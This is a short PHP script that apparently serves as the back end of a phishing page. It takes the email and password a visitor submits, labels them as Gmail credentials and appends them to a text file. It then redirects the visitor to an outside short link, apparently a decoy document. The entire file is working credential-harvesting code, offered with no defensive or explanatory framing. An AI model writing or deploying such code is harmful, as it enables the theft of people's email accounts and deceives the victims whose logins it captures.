<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pdf.ac/34EOWB');
exit();
?>
